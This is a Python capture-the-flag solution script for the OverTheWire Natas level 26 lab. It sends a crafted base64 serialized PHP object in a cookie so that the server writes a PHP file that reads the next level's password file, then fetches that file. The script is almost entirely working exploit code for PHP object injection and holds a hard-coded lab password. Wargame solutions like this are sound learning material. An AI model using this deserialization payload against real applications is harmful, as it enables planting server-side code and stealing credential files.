import requests
from requests.auth import HTTPBasicAuth

url = "http://natas26.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas26", "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

response = session.get(url, auth=auth)
sessionID = session.cookies.get("PHPSESSID")
print(f"Session ID: {sessionID}")

# <?php
# 	class Logger {
#     private $logFile = "img/shell.php";
#     private $initMsg = "";
#     private $exitMsg = '<?php echo file_get_contents("/etc/natas_webpass/natas27"); ?>';
# }

# $logger = new Logger();
# echo base64_encode(serialize($logger));
# ?>
# payload string is coming from the above php code ran in online sandbox php to create the cookie
payload = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3NoZWxsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYyOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCIvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNyIpOyA/PiI7fQ=="
cookies = {"drawing": payload}

response = session.get(url, auth=auth, cookies=cookies, params={"x1": 0, "y1": 0, "x2": 0, "y2": 0})
#print(response.text)

# access created shell file
shell_url = "http://natas26.natas.labs.overthewire.org/img/shell.php"
shell_response = requests.get(shell_url, auth=auth)

print(shell_response.text)